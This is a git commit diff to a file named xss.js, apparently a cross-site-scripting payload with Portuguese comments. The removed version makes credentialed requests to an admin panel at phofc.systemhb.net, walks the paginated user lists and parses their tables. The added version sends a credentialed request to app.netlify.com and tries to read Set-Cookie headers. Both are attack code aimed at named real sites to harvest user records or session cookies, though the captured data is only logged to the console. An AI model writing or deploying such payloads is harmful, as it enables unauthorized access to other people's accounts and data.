457ed846a9180507b06d2c0d9e41ee4ee90e8cf8
CebolaJonas <105110332+CebolaJonas@users.noreply.github.com>
2025-01-19 16:43:08 -0500

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,23 +1,14 @@
-fetch('https://phofc.systemhb.net/DPanel/usuario', { method: 'GET', credentials: 'include' })
-  .then(function (request) {
-    return request.text();
-  })
-  .then(function (htmlString) {
-    const parser = new DOMParser();
-    const htmlDoc = parser.parseFromString(htmlString, 'text/html');
-    const pagination = htmlDoc.querySelector('.paginacao span');
-    const paginationFormatted = pagination.textContent.slice(3, 5);
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "https://app.netlify.com", true);  // Fazendo a requisição para o subdomínio
+xhr.withCredentials = true;  // Envia cookies com a requisição CORS
 
-    for (let i = 1; i <= paginationFormatted; i++) {
-      fetch(`https://phofc.systemhb.net/DPanel/usuario?pagina=${i}`)
-        .then(function (request) {
-          return request.text();
-        })
-        .then(function (data) {
-          const parser = new DOMParser();
-          const htmlDoc = parser.parseFromString(data, 'text/html');
-          const tbody = htmlDoc.querySelector('table tbody');
-          console.log(tbody);
-        });
-    }
-  });
+xhr.onreadystatechange = function() {
+  if (xhr.readyState == 4 && xhr.status == 200) {
+    // A resposta contém os cookies da resposta 'Set-Cookie'
+    var cookies = xhr.getResponseHeader('Set-Cookie');
+    
+    // Exibe os cookies no console
+    console.log('Cookies recebidos: ', cookies);
+  }
+};
+xhr.send();  // Envia a requisição
